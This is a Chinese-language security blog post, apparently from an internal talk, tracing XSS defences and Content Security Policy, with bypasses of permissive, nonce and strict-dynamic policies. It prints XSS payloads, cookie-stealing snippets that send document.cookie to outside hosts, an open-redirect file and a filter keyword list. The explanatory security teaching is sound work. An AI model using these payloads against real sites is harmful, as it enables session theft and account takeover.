---
title: 前端防御从入门到弃坑--CSP变迁
date: 2017-10-25 17:59:23
tags:
- CSP
- xss
---

原文是我在内部showcase的时候修改而来的，总结了一些这一年接触CSP的很多感想...

<!--more-->

# 前端防御的开始

对于一个基本的XSS漏洞页面，它发生的原因往往是从用户输入的数据到输出没有有效的过滤，就比如下面的这个范例代码。

```
<?php
$a = $_GET['a'];
echo $a;
```

对于这样毫无过滤的页面，我们可以使用各种方式来构造一个xss漏洞利用。

```
a=<script>alert(1)</script>
a=<img/src=1/onerror=alert(1)>
a=<svg/onload=alert(1)>
```

对于这样的漏洞点来说，我们通常会使用htmlspecialchars函数来过滤输入，这个函数会处理5种符号。

```
& (AND) => &amp;
" (双引号) => &quot; (当ENT_NOQUOTES没有设置的时候) 
' (单引号) => &#039; (当ENT_QUOTES设置) 
< (小于号) => &lt; 
> (大于号) => &gt; 
```

一般意义来说，对于上面的页面来说，这样的过滤可能已经足够了，但是很多时候场景永远比想象的更多。

```
<a href="{输入点}">

<div style="{输入点}">

<img src="{输入点}">

<img src={输入点}>(没有引号)

<script>{输入点}</script>
```

对于这样的场景来说，上面的过滤已经没有意义了，尤其输入点在script标签里的情况，刚才的防御方式可以说是毫无意义。

一般来说，为了能够应对这样的xss点，我们会使用更多的过滤方式。

首先是肯定对于符号的过滤，为了能够应对各种情况，我们可能需要过滤下面这么多符号
```
% * + , – / ; < = > ^ | `
```

但事实上过度的过滤符号严重影响了用户正常的输入，这也是这种过滤使用非常少的原因。

大部分人都会选择使用htmlspecialchars+黑名单的过滤方法
```
on\w+=
script
svg
iframe
link
…
```

这样的过滤方式如果做的足够好，看上去也没什么问题，但回忆一下我们曾见过的那么多XSS漏洞，大多数漏洞的产生点，都是过滤函数忽略的地方。

那么，是不是有一种更底层的防御方式，可以从浏览器的层面来防御漏洞呢？

CSP就这样诞生了...

# 0x02 CSP（Content Security Policy）

Content Security Policy （CSP）内容安全策略，是一个附加的安全层，有助于检测并缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入攻击。

CSP的特点就是他是在浏览器层面做的防护，是和同源策略同一级别，除非浏览器本身出现漏洞，否则不可能从机制上绕过。

CSP只允许被认可的JS块、JS文件、CSS等解析，只允许向指定的域发起请求。

一个简单的CSP规则可能就是下面这样
```
header("Content-Security-Policy: default-src 'self'; script-src 'self' https://lorexxar.cn;");
```

其中的规则指令分很多种，每种指令都分管浏览器中请求的一部分。
![image.png-35kB][1]

每种指令都有不同的配置
![image.png-1359.4kB][2]

简单来说，针对不同来源，不同方式的资源加载，都有相应的加载策略。

我们可以说，如果一个站点有足够严格的CSP规则，那么XSS or CSRF就可以从根源上被防止。

但事实真的是这样吗？

# 0x03 CSP Bypass

CSP可以很严格，严格到甚至和很多网站的本身都想相冲突。

为了兼容各种情况，CSP有很多松散模式来适应各种情况。

在便利开发者的同时，很多安全问题就诞生了。

CSP对前端攻击的防御主要有两个：
1、限制js的执行。
2、限制对不可信域的请求。

接下来的多种Bypass手段也是围绕这两种的。

## 1

```
header("Content-Security-Policy: default-src 'self '; script-src * ");
```

天才才能写出来的CSP规则，可以加载任何域的js
```
<script src="http://lorexxar.cn/evil.js"></script>
```

随意开火

## 2

```
header("Content-Security-Policy: default-src 'self'; script-src 'self' ");
```

最普通最常见的CSP规则，只允许加载当前域的js。

站内总会有上传图片的地方，如果我们上传一个内容为js的图片，图片就在网站的当前域下了。

```test.jpg
alert(1);//
```

直接加载图片就可以了
```
<script src='upload/test.js'></script>
```

## 3
```
header(" Content-Security-Policy: default-src 'self '; script-src http://127.0.0.1/static/ ");
```

当你发现设置self并不安全的时候，可能会选择把静态文件的可信域限制到目录，看上去好像没什么问题了。

但是如果可信域内存在一个可控的重定向文件，那么CSP的目录限制就可以被绕过。

假设static目录下存在一个302文件
```
Static/302.php

<?php Header("location: ".$_GET['url'])?>
```

像刚才一样，上传一个test.jpg
然后通过302.php跳转到upload目录加载js就可以成功执行

```
<script src="static/302.php?url=upload/test.jpg">
```

## 4
```
header("Content-Security-Policy: default-src 'self'; script-src 'self' ");
```

CSP除了阻止不可信js的解析以外，还有一个功能是组织向不可信域的请求。

在上面的CSP规则下，如果我们尝试加载外域的图片，就会被阻止
```
<img src="http://lorexxar.cn/1.jpg">  ->  阻止
```

在CSP的演变过程中，难免就会出现了一些疏漏
```
<link rel="prefetch" href="http://lorexxar.cn"> (H5预加载)(only chrome)
<link rel="dns-prefetch" href="http://lorexxar.cn"> （DNS预加载）
```

在CSP1.0中，对于link的限制并不完整，不同浏览器包括chrome和firefox对CSP的支持都不完整，每个浏览器都维护一份包括CSP1.0、部分CSP2.0、少部分CSP3.0的CSP规则。

## 5

无论CSP有多么严格，但你永远都不知道会写出什么样的代码。

下面这一段是Google团队去年一份关于CSP的报告中的一份范例代码
```
// <input id="cmd" value="alert,safe string">

var array = document.getElementById('cmd').value.split(',');
window[array[0]].apply(this, array.slice(1));
```

机缘巧合下，你写了一段执行输入字符串的js。

事实上，很多现代框架都有这样的代码，从既定的标签中解析字符串当作js执行。

```
angularjs甚至有一个ng-csp标签来完全兼容csp，在csp存在的情况下也能顺利执行。
```

对于这种情况来说，CSP就毫无意义了

## 6

```
header("Content-Security-Policy: default-src 'self'; script-src 'self' ");
```

或许你的站内并没有这种问题，但你可能会使用jsonp来跨域获取数据，现代很流行这种方式。

但jsonp本身就是CSP的克星，jsonp本身就是处理跨域问题的，所以它一定在可信域中。

```
<script
src="/path/jsonp?callback=alert(document.domain)//">
</script>

/* API response */
alert(document.domain);//{"var": "data", ...});
```

这样你就可以构造任意js，即使你限制了callback只获取`\w+`的数据，部分js仍然可以执行，配合一些特殊的攻击手段和场景，仍然有危害发生。

唯一的办法是返回类型设置为json格式。

## 7

```
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' ");
```

比起刚才的CSP规则来说，这才是最最普通的CSP规则。

unsafe-inline是处理内联脚本的策略，当CSP中制定script-src允许内联脚本的时候，页面中直接添加的脚本就可以被执行了。

```
<script>
js code; //在unsafe-inline时可以执行
</script>
```

既然我们可以任意执行js了，剩下的问题就是怎么绕过对可信域的限制。

### 1 js生成link prefetch

第一种办法是通过js来生成link prefetch
```
var n0t = document.createElement("link");
n0t.setAttribute("rel", "prefetch");
n0t.setAttribute("href", "//ssssss.com/?" + document.cookie);
document.head.appendChild(n0t);
```

这种办法只有chrome可以用，但是意外的好用。

### 2 跳转 跳转 跳转

在浏览器的机制上， 跳转本身就是跨域行为

```
<script>location.href=http://lorexxar.cn?a+document.cookie</script>

<script>windows.open(http://lorexxar.cn?a=+document.cooke)</script>

<meta http-equiv="refresh" content="5;http://lorexxar.cn?c=[cookie]">
```

通过跨域请求，我们可以把我们想要的各种信息传出

### 3 跨域请求

在浏览器中，有很多种请求本身就是跨域请求，其中标志就是href。

```
var a=document.createElement("a");
a.href='http://xss.com/?cookie='+escape(document.cookie);
a.click();
```

包括表单的提交，都是跨域请求

# 0x04 CSP困境以及升级

在CSP正式被提出作为减轻XSS攻击的手段之后，几年内不断的爆出各种各样的问题。

2016年12月Google团队发布了关于CSP的调研文章《CSP is Dead, Long live CSP》

[https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/45542.pdf](https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/45542.pdf)

Google团队利用他们强大的搜索引擎库，分析了超过160w台主机的CSP部署方式，他们发现。

加载脚本最常列入白名单的有15个域，其中有14个不安全的站点，因此有75.81%的策略因为使用了了脚本白名单，允许了攻击者绕过了CSP。总而言之，我们发现尝试限制脚本执行的策略中有94.68%是无效的，并且99.34%具有CSP的主机制定的CSP策略对xss防御没有任何帮助。

在paper中，Google团队正式提出了两种以前被提出的CSP种类。

## 1、nonce script CSP

```
header("Content-Security-Policy: default-src 'self'; script-src 'nonce-{random-str}' ");
```

动态的生成nonce字符串，只有包含nonce字段并字符串相等的script块可以被执行。

```
<script nonce="{random-str}">alert(1)</script>
```

这个字符串可以在后端实现，每次请求都重新生成，这样就可以无视哪个域是可信的，只要保证所加载的任何资源都是可信的就可以了。

```
<?php

Header("Content-Security-Policy: script-src 'nonce-".$random." '"");
?>
<script nonce="<?php echo $random?>">
```

## 2、strict-dynamic

```
header("Content-Security-Policy: default-src 'self'; script-src 'strict-dynamic' ");
```

SD意味着可信js生成的js代码是可信的。

这个CSP规则主要是用来适应各种各样的现代前端框架，通过这个规则，可以大幅度避免因为适应框架而变得松散的CSP规则。

Google团队提出的这两种办法，希望通过这两种办法来适应各种因为前端发展而出现的CSP问题。

但攻与防的变迁永远是交替升级的。

## 1、nonce script CSP Bypass

2016年12月，在Google团队提出nonce script CSP可以作为新的CSP趋势之后，圣诞节Sebastian Lekies提出了nonce CSP的致命缺陷。

**Nonce CSP对纯静态的dom xss简直没有防范能力**

[http://sirdarckcat.blogspot.jp/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html](http://sirdarckcat.blogspot.jp/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html)

Web2.0时代的到来让前后台交互的情况越来越多，为了应对这种情况，现代浏览器都有缓存机制，但页面中没有修改或者不需要再次请求后台的时候，浏览器就会从缓存中读取页面内容。

从**location.hash**就是一个典型的例子

如果JS中存在操作location.hash导致的xss，那么这样的攻击请求不会经过后台，那么nonce后的随机值就不会刷新。

这样的CSP Bypass方式我曾经出过ctf题目，详情可以看

[https://lorexxar.cn/2017/05/16/nonce-bypass-script/](https://lorexxar.cn/2017/05/16/nonce-bypass-script/)

除了最常见的location.hash，作者还提出了一个新的攻击方式，通过CSS选择器来读取页面内容。

```
*[attribute^="a"]{background:url("record?match=a")} 
*[attribute^="b"]{background:url("record?match=b")} 
*[attribute^="c"]{background:url("record?match=c")} [...] 
```

当匹配到对应的属性，页面就会发出相应的请求。

页面只变化了CSS，纯静态的xss。

CSP无效。

## 2、strict-dynamic Bypass

2017年7月 Blackhat，Google团队提出了全新的攻击方式Script Gadgets。

```
header("Content-Security-Policy: default-src 'self'; script-src 'strict-dynamic' ");
```

Strict-dynamic的提出正是为了适应现代框架
但Script Gadgets正是现代框架的特性

![image.png-75.4kB][3]

Script Gadgets
一种类似于短标签的东西，在现代的js框架中四处可见

```
For example:
Knockout.js

<div data-bind="value: 'foo'"></div>

Eval("foo")

<div data-bind="value: alert(1)"></dib>

bypass
```

Script Gadgets本身就是动态生成的js，所以对新型的CSP几乎是破坏式的Bypass。

![image.png-85.3kB][4]
![image.png-20.7kB][5]


# 0x05 写在最后

说了一大堆，黑名单配合CSP仍然是最靠谱的防御方式。

但，防御没有终点...

# 0x06 ref

- [1] [https://paper.seebug.org/91/](https://paper.seebug.org/91/)
- [2] [http://sirdarckcat.blogspot.jp/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html](http://sirdarckcat.blogspot.jp/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html)
- [3] [https://xianzhi.aliyun.com/forum/read/523.html](https://xianzhi.aliyun.com/forum/read/523.html)
- [4] [https://lorexxar.cn](https://lorexxar.cn)



  [1]: http://static.zybuluo.com/LoRexxar/xht98xm2jwyjckb5bfdjm5xq/image.png
  [2]: http://static.zybuluo.com/LoRexxar/xo1yr98en6xbcsxhdi3598mz/image.png
  [3]: http://static.zybuluo.com/LoRexxar/qeh93twveyzmu5ke9nvkftj6/image.png
  [4]: http://static.zybuluo.com/LoRexxar/dqprvm9xhl2e0zl1w4ssjjai/image.png
  [5]: http://static.zybuluo.com/LoRexxar/2btf59qi5yvbhrgo80zda064/image.png